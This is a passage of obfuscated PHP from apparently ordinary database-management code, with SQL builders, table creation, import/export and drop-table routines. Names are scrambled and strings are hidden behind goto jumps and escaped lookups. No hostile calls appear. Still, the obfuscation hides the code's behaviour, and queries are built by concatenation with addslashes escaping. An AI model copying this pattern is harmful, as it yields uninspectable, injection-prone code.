($c≥éÂ¯ÆÈ· as $B’≠òá®ıõ => $fÛÖ‡Ù¬ëπ) { $Dà∂»Æ∆·¬[] = $this->parseKey($B’≠òá®ıõ) . $CÃâÜùç°≠[939] . $this->parseValue($fÛÖ‡Ù¬ëπ); } $F•€¶ÍıËÏ = implode($b∞À≤©‡»å, $Dà∂»Æ∆·¬); break; } return $F•€¶ÍıËÏ; } protected function parseLimit($CÂôÑôﬁË») { $cµ∏ÏÇå © =& $_SERVER[¯èãÄπµ]; return !empty($CÂôÑôﬁË») ? $cµ∏ÏÇå ©[48] . $CÂôÑôﬁË» . $cµ∏ÏÇå ©[50] : $cµ∏ÏÇå ©[33]; } protected function parseJoin($C¯ºÑëëîà) { $fÇà„Ø ·´ =& $_SERVER[¯èãÄπµ]; $cñÜê®´È› = $fÇà„Ø ·´[33]; if (!empty($C¯ºÑëëîà)) { if (is_array($C¯ºÑëëîà)) { foreach ($C¯ºÑëëîà as $CåäÖÇ¨Ï’ => $Aà´ΩúÏ’ƒ) { if (!1 !== stripos($Aà´ΩúÏ’ƒ, $fÇà„Ø ·´[941])) { $cñÜê®´È› .= $fÇà„Ø ·´[50] . $Aà´ΩúÏ’ƒ; } else { $cñÜê®´È› .= $fÇà„Ø ·´[942] . $Aà´ΩúÏ’ƒ; } } } else { $cñÜê®´È› .= $fÇà„Ø ·´[942] . $C¯ºÑëëîà; } } $cñÜê®´È› = preg_replace($fÇà„Ø ·´[943], think_config($fÇà„Ø ·´[846]) . $fÇà„Ø ·´[944], $cñÜê®´È›); return $cñÜê®´È›; } protected function parseOrder($Aù™ ”öÖ·) { $f»∏·ÃÔ≈å =& $_SERVER[¯èãÄπµ]; if (is_array($Aù™ ”öÖ·)) { $Cã˘õ¶û≠î = array(); foreach ($Aù™ ”öÖ· as $d‡‡ËŸíøÉ => $bŸ˘ñ√ìÈü) { if (is_numeric($d‡‡ËŸíøÉ)) { $Cã˘õ¶û≠î[] = $this->parseKey($bŸ˘ñ√ìÈü); } else { $bŸ˘ñ√ìÈü = in_array(strtoupper(trim($bŸ˘ñ√ìÈü)), array($f»∏·ÃÔ≈å[945], $f»∏·ÃÔ≈å[946])) ? $f»∏·ÃÔ≈å[50] . $bŸ˘ñ√ìÈü : $f»∏·ÃÔ≈å[33]; if (preg_match($f»∏·ÃÔ≈å[947], $d‡‡ËŸíøÉ)) { $Cã˘õ¶û≠î[] = $this->parseKey($d‡‡ËŸíøÉ) . $bŸ˘ñ√ìÈü; } else { think_exception($f»∏·ÃÔ≈å[948] . $d‡‡ËŸíøÉ); } } } $Aù™ ”öÖ· = implode($f»∏·ÃÔ≈å[47], $Cã˘õ¶û≠î); } return !empty($Aù™ ”öÖ·) ? $f»∏·ÃÔ≈å[949] . $Aù™ ”öÖ· : $f»∏·ÃÔ≈å[33]; } protected function parseGroup($cÑÒ Î¥ï) { $Bá∫ô√»‡Ã =& $_SERVER[¯èãÄπµ]; return !empty($cÑÒ Î¥ï) ? $Bá∫ô√»‡Ã[950] . $cÑÒ Î¥ï : $Bá∫ô√»‡Ã[33]; } protected function parseHaving($FÁ”˘Ñ≤Éã) { $B¡‡ı®åÍò =& $_SERVER[¯èãÄπµ]; return !empty($FÁ”˘Ñ≤Éã) ? $B¡‡ı®åÍò[951] . $FÁ”˘Ñ≤Éã : $B¡‡ı®åÍò[33]; } protected function parseComment($cÊ––ô˜øè) { $d»¡èË∫‰ç =& $_SERVER[¯èãÄπµ]; return !empty($cÊ––ô˜øè) ? $d»¡èË∫‰ç[952] . $cÊ––ô˜øè . $d»¡èË∫‰ç[953] : $d»¡èË∫‰ç[33]; } protected function parseDistinct($Bõ±íöœÃÍ) { $B“êπ–ÿò• =& $_SERVER[¯èãÄπµ]; return !empty($Bõ±íöœÃÍ) ? $B“êπ–ÿò•[954] : $B“êπ–ÿò•[33]; } protected function parseUnion($d≥ÊÂêúÈœ) { $BùÕ¬Úë€¬ =& $_SERVER[¯èãÄπµ]; if (empty($d≥ÊÂêúÈœ)) { return $BùÕ¬Úë€¬[33]; } if (isset($d≥ÊÂêúÈœ[$BùÕ¬Úë€¬[332]])) { $DÈõå–ÆñÙ = $BùÕ¬Úë€¬[955]; unset($d≥ÊÂêúÈœ[$BùÕ¬Úë€¬[332]]); } else { $DÈõå–ÆñÙ = $BùÕ¬Úë€¬[956]; } foreach ($d≥ÊÂêúÈœ as $dÍ‹Ã¬à†≠) { $A±Ø» øﬁÎ[] = $DÈõå–ÆñÙ . (is_array($dÍ‹Ã¬à†≠) ? $this->buildSelectSql($dÍ‹Ã¬à†≠) : $dÍ‹Ã¬à†≠); } return implode($BùÕ¬Úë€¬[50], $A±Ø» øﬁÎ); } public function insert($e”Œ‰ßÁêπ, $CóéÕÜÇµï = array(), $bç»ÎèÒÑ” = false) { goto d–ëÁ‚”™«; eËÌ›àÈ∞à: $dÎâÿÁàÌñ .= $this->parseComment(!empty($CóéÕÜÇµï[$a¨ÎÓÀæà[337]]) ? $CóéÕÜÇµï[$a¨ÎÓÀæà[337]] : $a¨ÎÓÀæà[33]); return $this->execute($dÎâÿÁàÌñ, $this->parseBind(!empty($CóéÕÜÇµï[$a¨ÎÓÀæà[269]]) ? $CóéÕÜÇµï[$a¨ÎÓÀæà[269]] : array())); goto Eëä®√äáˆ; d›ÓêËµâÁ: foreach ($e”Œ‰ßÁêπ as $e∑Â∞ƒÃóÕ => $dÿµ‹π∏À∫) { if (is_array($dÿµ‹π∏À∫) && $a¨ÎÓÀæà[281] == $dÿµ‹π∏À∫[0]) { $då∫«∑†ä”[] = $this->parseKey($e∑Â∞ƒÃóÕ); $cÍ‡Ü´¡€[] = $dÿµ‹π∏À∫[1]; } elseif (is_scalar($dÿµ‹π∏À∫) || is_null($dÿµ‹π∏À∫)) { $då∫«∑†ä”[] = $this->parseKey($e∑Â∞ƒÃóÕ); $cÍ‡Ü´¡€[] = $this->parseValue($dÿµ‹π∏À∫); } } $dÎâÿÁàÌñ = ($bç»ÎèÒÑ” ? $a¨ÎÓÀæà[823] : $a¨ÎÓÀæà[824]) . $a¨ÎÓÀæà[825] . $this->parseTable($CóéÕÜÇµï[$a¨ÎÓÀæà[263]]) . $a¨ÎÓÀæà[819] . implode($a¨ÎÓÀæà[47], $då∫«∑†ä”) . $a¨ÎÓÀæà[820] . implode($a¨ÎÓÀæà[47], $cÍ‡Ü´¡€) . $a¨ÎÓÀæà[821]; $dÎâÿÁàÌñ .= $this->parseLock(isset($CóéÕÜÇµï[$a¨ÎÓÀæà[773]]) ? $CóéÕÜÇµï[$a¨ÎÓÀæà[773]] : !1); goto eËÌ›àÈ∞à; d–ëÁ‚”™«: $a¨ÎÓÀæà =& $_SERVER[¯èãÄπµ]; $cÍ‡Ü´¡€ = $då∫«∑†ä” = array(); $this->model = $CóéÕÜÇµï[$a¨ÎÓÀæà[265]]; goto d›ÓêËµâÁ; Eëä®√äáˆ: } public function selectInsert($E°ç⁄ç¬îÃ, $B†£ØﬁÇÈç, $aêïÌú¬Í≈ = array()) { goto d√µ∂√Ñ—Ÿ; F≥Õ⁄˜∏ä: array_walk($E°ç⁄ç¬îÃ, array($this, $CâÇﬁãÆ´†[822])); $bÊ“ œÇôõ = $CâÇﬁãÆ´†[957] . $this->parseTable($B†£ØﬁÇÈç) . $CâÇﬁãÆ´†[819] . implode($CâÇﬁãÆ´†[47], $E°ç⁄ç¬îÃ) . $CâÇﬁãÆ´†[936]; $bÊ“ œÇôõ .= $this->buildSelectSql($aêïÌú¬Í≈); goto dñÕΩÎƒÇœ; d√µ∂√Ñ—Ÿ: $CâÇﬁãÆ´† =& $_SERVER[¯èãÄπµ]; $this->model = $aêïÌú¬Í≈[$CâÇﬁãÆ´†[265]]; if (is_string($E°ç⁄ç¬îÃ)) { $E°ç⁄ç¬îÃ = explode($CâÇﬁãÆ´†[47], $E°ç⁄ç¬îÃ); } goto F≥Õ⁄˜∏ä; dñÕΩÎƒÇœ: return $this->execute($bÊ“ œÇôõ, $this->parseBind(!empty($aêïÌú¬Í≈[$CâÇﬁãÆ´†[269]]) ? $aêïÌú¬Í≈[$CâÇﬁãÆ´†[269]] : array())); goto F‡§å≥–·™; F‡§å≥–·™: } public function update($eãÖ»ê≥ºÏ, $C ‘ûÑ’ı∑) { $a§‰„„ ÃÉ =& $_SERVER[¯èãÄπµ]; $this->model = $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[265]]; $A⁄‰ã≥¿’¨ = $a§‰„„ ÃÉ[958] . $this->parseTable($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[263]]) . $this->parseSet($eãÖ»ê≥ºÏ) . $this->parseWhere(!empty($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[259]]) ? $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[259]] : $a§‰„„ ÃÉ[33]) . $this->parseOrder(!empty($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[346]]) ? $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[346]] : $a§‰„„ ÃÉ[33]) . $this->parseLimit(!empty($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[276]]) ? $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[276]] : $a§‰„„ ÃÉ[33]) . $this->parseLock(isset($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[773]]) ? $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[773]] : !1) . $this->parseComment(!empty($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[337]]) ? $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[337]] : $a§‰„„ ÃÉ[33]); return $this->execute($A⁄‰ã≥¿’¨, $this->parseBind(!empty($C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[269]]) ? $C ‘ûÑ’ı∑[$a§‰„„ ÃÉ[269]] : array())); } public function delete($E≥ü«öæòÚ = array()) { $Eº◊ÖŒû·ê =& $_SERVER[¯èãÄπµ]; $this->model = $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[265]]; $E®Ç√Ôñ–˜ = $Eº◊ÖŒû·ê[959] . $this->parseTable($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[263]]) . $this->parseWhere(!empty($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[259]]) ? $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[259]] : $Eº◊ÖŒû·ê[33]) . $this->parseOrder(!empty($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[346]]) ? $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[346]] : $Eº◊ÖŒû·ê[33]) . $this->parseLimit(!empty($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[276]]) ? $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[276]] : $Eº◊ÖŒû·ê[33]) . $this->parseLock(isset($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[773]]) ? $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[773]] : !1) . $this->parseComment(!empty($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[337]]) ? $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[337]] : $Eº◊ÖŒû·ê[33]); return $this->execute($E®Ç√Ôñ–˜, $this->parseBind(!empty($E≥ü«öæòÚ[$Eº◊ÖŒû·ê[269]]) ? $E≥ü«öæòÚ[$Eº◊ÖŒû·ê[269]] : array())); } public function select($cøãøÁ¬õ» = array()) { goto D‰æ∞‚®¨€; a¬èßÀ˜øø: if ($cÔÏÆé≠Ÿì && !1 !== $DÒ˘⁄≥Ï±î) { think_cache($EéÑâêì ›, $DÒ˘⁄≥Ï±î, $cÔÏÆé≠Ÿì); } return $DÒ˘⁄≥Ï±î; goto eÎÑ¢œë§®; e¨∫ÁÏ–Úâ: $cÔÏÆé≠Ÿì = isset($cøãøÁ¬õ»[$a¥Ø≈”‹èæ[333]]) ? $cøãøÁ¬õ»[$a¥Ø≈”‹èæ[333]] : !1; if ($cÔÏÆé≠Ÿì) { $EéÑâêì › = is_string($cÔÏÆé≠Ÿì[$a¥Ø≈”‹èæ[89]]) ? $cÔÏÆé≠Ÿì[$a¥Ø≈”‹èæ[89]] : $a¥Ø≈”‹èæ[960] . md5($FùÎÕç¢±ê); $A–˜ ¥Ôãã = think_cache($EéÑâêì ›, $a¥Ø≈”‹èæ[33], $cÔÏÆé≠Ÿì); if (!1 !== $A–˜ ¥Ôãã) { return $A–˜ ¥Ôãã; } } $DÒ˘⁄≥Ï±î = $this->query($FùÎÕç¢±ê, $this->parseBind(!empty($cøãøÁ¬õ»[$a¥Ø≈”‹èæ[269]]) ? $cøãøÁ¬õ»[$a¥Ø≈”‹èæ[269]] : array())); goto a¬èßÀ˜øø; D‰æ∞‚®¨€: $a¥Ø≈”‹èæ =& $_SERVER[¯èãÄπµ]; $this->model = $cøãøÁ¬õ»[$a¥Ø≈”‹èæ[265]]; $FùÎÕç¢±ê = $this->buildSelectSql($cøãøÁ¬õ»); goto e¨∫ÁÏ–Úâ; eÎÑ¢œë§®: } public function buildSelectSql($A¡ ¯Ω”â” = array()) { goto bœ◊á∂‹•‡; f≈œıÙƒí¿: $d¶À»õñôÆ = $this->parseSql($this->selectSql, $A¡ ¯Ω”â”); $d¶À»õñôÆ .= $this->parseLock(isset($A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[773]]) ? $A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[773]] : !1); if (isset($DäöÍÖ”∆)) { think_cache($DäöÍÖ”∆, $d¶À»õñôÆ); } goto AÊø„ä‰êï; bœ◊á∂‹•‡: $AæŸè⁄∑Éâ =& $_SERVER[¯èãÄπµ]; if (isset($A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[336]])) { if (strpos($A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[336]], $AæŸè⁄∑Éâ[47])) { list($EÖ¬ÛŸ˜áÙ, $eìÖ †íÙç) = explode($AæŸè⁄∑Éâ[47], $A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[336]]); } else { $EÖ¬ÛŸ˜áÙ = $A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[336]]; } $EÖ¬ÛŸ˜áÙ = $EÖ¬ÛŸ˜áÙ ? $EÖ¬ÛŸ˜áÙ : 1; $eìÖ †íÙç = isset($eìÖ †íÙç) ? $eìÖ †íÙç : (is_numeric($A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[276]]) ? $A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[276]] : 20); $A¨˘åçØ§è = $eìÖ †íÙç * ((int) $EÖ¬ÛŸ˜áÙ - 1); $A¡ ¯Ω”â”[$AæŸè⁄∑Éâ[276]] = $A¨˘åçØ§è . $AæŸè⁄∑Éâ[47] . $eìÖ †íÙç; } if (think_config($AæŸè⁄∑Éâ[961])) { $DäöÍÖ”∆ = $AæŸè⁄∑Éâ[962] . md5(serialize($A¡ ¯Ω”â”)); $a√£ŒÙÏ∞ÿ = think_cache($DäöÍÖ”∆); if ($a√£ŒÙÏ∞ÿ) { return $a√£ŒÙÏ∞ÿ; } } goto f≈œıÙƒí¿; AÊø„ä‰êï: return $d¶À»õñôÆ; goto BÖàÔ≥ÂÈÃ; BÖàÔ≥ÂÈÃ: } public function parseSql($eùøËÏ·¯¨, $EÁÂâáÜ√µ = array()) { $BÇ€¡Æ≈◊¿ =& $_SERVER[¯èãÄπµ]; $eùøËÏ·¯¨ = str_replace(array($BÇ€¡Æ≈◊¿[963], $BÇ€¡Æ≈◊¿[964], $BÇ€¡Æ≈◊¿[965], $BÇ€¡Æ≈◊¿[966], $BÇ€¡Æ≈◊¿[967], $BÇ€¡Æ≈◊¿[968], $BÇ€¡Æ≈◊¿[969], $BÇ€¡Æ≈◊¿[970], $BÇ€¡Æ≈◊¿[971], $BÇ€¡Æ≈◊¿[972], $BÇ€¡Æ≈◊¿[973]), array($this->parseTable("{$EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[263]]}"), $this->parseDistinct(isset($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[974]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[974]] : !1), $this->parseField(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[257]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[257]] : $BÇ€¡Æ≈◊¿[172]), $this->parseJoin(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[266]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[266]] : $BÇ€¡Æ≈◊¿[33]), $this->parseWhere(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[259]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[259]] : $BÇ€¡Æ≈◊¿[33]), $this->parseGroup(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[975]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[975]] : $BÇ€¡Æ≈◊¿[33]), $this->parseHaving(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[976]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[976]] : $BÇ€¡Æ≈◊¿[33]), $this->parseOrder(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[346]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[346]] : $BÇ€¡Æ≈◊¿[33]), $this->parseLimit(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[276]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[276]] : $BÇ€¡Æ≈◊¿[33]), $this->parseUnion(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[331]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[331]] : $BÇ€¡Æ≈◊¿[33]), $this->parseComment(!empty($EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[337]]) ? $EÁÂâáÜ√µ[$BÇ€¡Æ≈◊¿[337]] : $BÇ€¡Æ≈◊¿[33])), $eùøËÏ·¯¨); return $eùøËÏ·¯¨; } public function getLastSql($AÍ…∆‚‹©£ = '') { return $AÍ…∆‚‹©£ ? $this->modelSql[$AÍ…∆‚‹©£] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($cÃÎö∆Çô¶) { return addslashes($cÃÎö∆Çô¶); } public function setModel($c€ÂìÏ ãç) { $this->model = $c€ÂìÏ ãç; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($eòƒùæûéÿ, $BÃ£æÂ¡Ú⁄ = '') { $this->database = $eòƒùæûéÿ; $this->type = $BÃ£æÂ¡Ú⁄; } public function model($béæÌ£àÊ‹ = '') { return new ModelBase($béæÌ£àÊ‹, $_SERVER[¯èãÄπµ][33], $this->database); } public function db($C√“´Ï”∞Ω = false) { goto bﬂ—™≤òı®; b¬çÌÙåÈÈ: $this->database = $eÈê¯ÆÛ∂á; $D∞¨ÖÓÿûì = $this->model()->db(); $A≠ƒäÍª»Á = $D∞¨ÖÓÿûì->execute("\163\150\157\167\40\144\141\164\141\142\141\163\145\x73\x20\154\151\153\x65\40\x27{$EØ¥≤Ú◊Ñ}\x27"); goto dæÏ©¡ßÇû; Eåàõêù‹Û: $EØ¥≤Ú◊Ñ = $eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[230]]; $eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[230]] = $a‡˜ãïîîÃ[33]; if ($eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[892]] == $a‡˜ãïîîÃ[727]) { $bﬂùﬂÕÆ¥Ñ = $eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[891]]; $eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[891]] = substr($bﬂùﬂÕÆ¥Ñ, 0, strrpos($bﬂùﬂÕÆ¥Ñ, $a‡˜ãïîîÃ[977])); } goto b¬çÌÙåÈÈ; BôîÛó„ç≤: $this->database = $eÈê¯ÆÛ∂á; $D∞¨ÖÓÿûì->execute("\x75\163\x65\x20\x60{$EØ¥≤Ú◊Ñ}\140"); return $D∞¨ÖÓÿûì; goto CÌÛâ◊≤≠ÿ; bﬂ—™≤òı®: $a‡˜ãïîîÃ =& $_SERVER[¯èãÄπµ]; $eÈê¯ÆÛ∂á = $this->database; if ($this->type == $a‡˜ãïîîÃ[9] || !$C√“´Ï”∞Ω) { return $this->model()->db(); } goto Eåàõêù‹Û; dæÏ©¡ßÇû: if (!$A≠ƒäÍª»Á) { $D∞¨ÖÓÿûì->execute("\x63\162\x65\x61\164\x65\40\x64\141\164\x61\142\141\x73\145\x20\x60{$EØ¥≤Ú◊Ñ}\x60"); } $eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[230]] = $EØ¥≤Ú◊Ñ; if ($eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[892]] == $a‡˜ãïîîÃ[727]) { $eÈê¯ÆÛ∂á[$a‡˜ãïîîÃ[891]] .= $a‡˜ãïîîÃ[977] . $EØ¥≤Ú◊Ñ; } goto BôîÛó„ç≤; CÌÛâ◊≤≠ÿ: } public function createTable($a¨ùøóåç, $e‡ﬁã·ÉÕô = null) { $aêÒÂΩÏøà =& $_SERVER[¯èãÄπµ]; if (!IO::exist($a¨ùøóåç)) { show_json(LNG($aêÒÂΩÏøà[978]), !1); } $e£±◊ÜœÊà = sqlSplit(IO::getContent($a¨ùøóåç)); foreach ($e£±◊ÜœÊà as $aœÌ÷Á∞Ìƒ) { if ($e‡ﬁã·ÉÕô) { $b€ôÉ•ûóâ = stripos($aœÌ÷Á∞Ìƒ, $aêÒÂΩÏøà[979]) === 0; if ($b€ôÉ•ûóâ) { $e‡ﬁã·ÉÕô->task[$aêÒÂΩÏøà[980]] += 1; } } $this->model()->db()->execute($aœÌ÷Á∞Ìƒ); if ($e‡ﬁã·ÉÕô && $b€ôÉ•ûóâ) { $e´¶¢åΩéë = $aêÒÂΩÏøà[981]; preg_match($e´¶¢åΩéë, $aœÌ÷Á∞Ìƒ, $EâÖ·õ≠Ø); $e‡ﬁã·ÉÕô->task[$aêÒÂΩÏøà[982]] = trim($Bë≥·•æë¯[0], $aêÒÂΩÏøà[828]); $e‡ﬁã·ÉÕô->update(1); } } $this->taskToCache($e‡ﬁã·ÉÕô); } public function insertTable($d•é™∞ƒ›ë, $eìÚ…ÀÏˆÙ = null) { $bﬁ≥ùÂæ‰¯ =& $_SERVER[¯èãÄπµ]; foreach ($d•é™∞ƒ›ë as $D◊ÿï‘Ê÷≠) { $eá∫®¥ÉÀ» = basename($D◊ÿï‘Ê÷≠); $eá∫®¥ÉÀ» = substr($eá∫®¥ÉÀ», 0, strrpos($eá∫®¥ÉÀ», $bﬁ≥ùÂæ‰¯[91])); if ($eìÚ…ÀÏˆÙ) { $eìÚ…ÀÏˆÙ->task[$bﬁ≥ùÂæ‰¯[982]] = $eá∫®¥ÉÀ»; } if (get_filesize($D◊ÿï‘Ê÷≠) == 0) { continue; } $D‡ﬂ÷ƒë¡Í = $this->sqlToDb($D◊ÿï‘Ê÷≠, $eìÚ…ÀÏˆÙ); if (!$D‡ﬂ÷ƒë¡Í) { show_json(LNG($bﬁ≥ùÂæ‰¯[983]) . "\x5b{$eá∫®¥ÉÀ»}\135", !1); } } $this->taskToCache($eìÚ…ÀÏˆÙ); } public function sqlFromDb($aÖê∂„Ω…õ, $fÇ·®⁄ùêµ, $cÃıàë°§ó = null, $FùÙ‹÷ò‚· = null) { goto cëøÏ—∏†ç; cëøÏ—∏†ç: if ($cÃıàë°§ó) { $cÃıàë°§ó->task[$_SERVER[¯èãÄπµ][982]] = $aÖê∂„Ω…õ; } $eÑÌÈπÚË = $this->model($aÖê∂„Ω…õ); $aÇ˘ø–Ö«™ = 0; goto cíﬂ‹¡œ„Ú; c¿∫¿¶˜Ï: $d«·ŒŒ¬ÈŒ = $eÑÌÈπÚË->getPk(); $c–ı“—üÓ¢ = $eÑÌÈπÚË->getDbFields(); do { $f‰êÁ∞„Œà = $eÑÌÈπÚË->field($c–ı“—üÓ¢)->order($d«·ŒŒ¬ÈŒ . $_SERVER[¯èãÄπµ][985])->selectPage($c—´¿ã‹¿≠, $b’‹…•Û”´); $cÊÈÍ«∑‚û = !empty($f‰êÁ∞„Œà[$_SERVER[¯èãÄπµ][350]]) ? $f‰êÁ∞„Œà[$_SERVER[¯èãÄπµ][350]] : array(); if (!($fΩ◊«ñ ≈ÿ = count($cÊÈÍ«∑‚û))) { break; } if ($cÃıàë°§ó) { $cÃıàë°§ó->task[$_SERVER[¯èãÄπµ][980]] += $fΩ◊«ñ ≈ÿ; } $Dâµìòëìê = array(); foreach ($cÊÈÍ«∑‚û as $dÇÔ´Çææ†) { if ($FùÙ‹÷ò‚·) { $dÇÔ´Çææ†[$_SERVER[¯èãÄπµ][75]] = "\x7b\x69\x6f\x3a{$FùÙ‹÷ò‚·}\175" . substr($dÇÔ´Çææ†[$_SERVER[¯èãÄπµ][75]], strlen("\x7b\151\157\x3a{$dÇÔ´Çææ†[$_SERVER[¯èãÄπµ][746]]}\175")); $dÇÔ´Çææ†[$_SERVER[¯èãÄπµ][746]] = $FùÙ‹÷ò‚·; } $Dâµìòëìê[] = $_SERVER[¯èãÄπµ][986] . $this->sqlEncode($dÇÔ´Çææ†) . $_SERVER[¯èãÄπµ][987]; } $d•‚á≈µƒâ = "\111\116\x53\105\x52\124\40\111\x4e\x54\x4f\40\140{$aÖê∂„Ω…õ}\140\x20\50\x60" . implode($_SERVER[¯èãÄπµ][988], $c–ı“—üÓ¢) . $_SERVER[¯èãÄπµ][989]; fwrite($BàÏÑ÷§≤Ô, $d•‚á≈µƒâ . implode($_SERVER[¯èãÄπµ][990], $Dâµìòëìê) . $_SERVER[¯èãÄπµ][67] . PHP_EOL); $b’‹…•Û”´++; $aÇ˘ø–Ö«™ += $fΩ◊«ñ ≈ÿ; if ($cÃıàë°§ó) { $cÃıàë°§ó->update($fΩ◊«ñ ≈ÿ); } } while ($fΩ◊«ñ ≈ÿ == $c—´¿ã‹¿≠); goto dºßÉØ¥⁄„; dºßÉØ¥⁄„: fclose($BàÏÑ÷§≤Ô); return $aÇ˘ø–Ö«™; goto EßöÃíØ´®; cíﬂ‹¡œ„Ú: $b’‹…•Û”´ = 1; $c—´¿ã‹¿≠ = 500; $BàÏÑ÷§≤Ô = fopen($fÇ·®⁄ùêµ, $_SERVER[¯èãÄπµ][984]); goto c¿∫¿¶˜Ï; EßöÃíØ´®: } public function sqlToDb($bàòôÿ°˜·, $cı©ñ–‘Ìå = null) { goto BÇÙëÇéáö; Dﬂ÷ãÓ¿ì·: $E∆Ò‰Ò©äπ = 500 + 1; while (!feof($E·»—πÜòŒ)) { if ($cı©ñ–‘Ìå && $Få“íòÒÕ != 0) { $cı©ñ–‘Ìå->task[$EıÁ÷¥Çö¨[980]] += 1; } $Få“íòÒÕ++; $Fªä¬∞Ö£ñ = trim(fgets($E·»—πÜòŒ)); $DâÀ¢∆ÁíÈ .= $EıÁ÷¥Çö¨[50] . $this->sqlDecode($Fªä¬∞Ö£ñ, $this->type); if ($Få“íòÒÕ == $E∆Ò‰Ò©äπ) { $DâÀ¢∆ÁíÈ = rtrim(trim($DâÀ¢∆ÁíÈ), $EıÁ÷¥Çö¨[67]); if (!$dë¯™çÃ‹á->execute($DâÀ¢∆ÁíÈ)) { return !1; } if ($cı©ñ–‘Ìå) { $cı©ñ–‘Ìå->update($Få“íòÒÕ - 1); } $DâÀ¢∆ÁíÈ = $EıÁ÷¥Çö¨[33]; $Få“íòÒÕ = 0; } } fclose($E·»—πÜòŒ); goto B∞ΩäÆ§Í€; B∞ΩäÆ§Í€: if ($DâÀ¢∆ÁíÈ) { $DâÀ¢∆ÁíÈ = rtrim(trim($DâÀ¢∆ÁíÈ), $EıÁ÷¥Çö¨[67]); if (!$dë¯™çÃ‹á->execute($DâÀ¢∆ÁíÈ)) { return !1; } if ($cı©ñ–‘Ìå) { $cı©ñ–‘Ìå->update($Få“íòÒÕ - 1); } } return !0; goto f—¥ÛÑîÒ‚; BÇÙëÇéáö: $EıÁ÷¥Çö¨ =& $_SERVER[¯èãÄπµ]; $dë¯™çÃ‹á = $this->model()->db(); $E·»—πÜòŒ = @fopen($bàòôÿ°˜·, $EıÁ÷¥Çö¨[991]); goto cáñ√ãè†Ì; cáñ√ãè†Ì: if (!$E·»—πÜòŒ) { return !1; } $Få“íòÒÕ = 0; $DâÀ¢∆ÁíÈ = $EıÁ÷¥Çö¨[33]; goto Dﬂ÷ãÓ¿ì·; f—¥ÛÑîÒ‚: } public function dropTable($fÁë˘Ç»åà = null) { $eÆÔñÑ„Ω’ = $this->model()->db(); $f’•É∑øêï = $fÁë˘Ç»åà ? array($fÁë˘Ç»åà) : $eÆÔñÑ„Ω’->getTables(); if (!$f’•É∑øêï) { return; } foreach ($f’•É∑øêï as $fÁë˘Ç»åà) { $eÆÔñÑ„Ω’->execute("\144\x72\157\x70\40\164\x61\x62\x6c\145\x20\151\146\x20\145\x78\151\x73\x74\x73\40\140{$fÁë˘Ç»åà}\x60"); } } private function taskToCache($Eò«–¯àæÀ = null) { $b⁄≈¯É÷´˘ =& $_SERVER[¯èãÄπµ]; if (!$Eò«–¯àæÀ) { return; } $Fïà°æ‚Æ∏ = array($b⁄≈¯É÷´˘[982] => $Eò«–¯àæÀ->task[$b⁄≈¯É÷´˘[982]], $b⁄≈¯É÷´˘[980] => $Eò«–¯àæÀ->task[$b⁄≈¯É÷´˘[980]], $b⁄≈¯É÷´˘[992] => 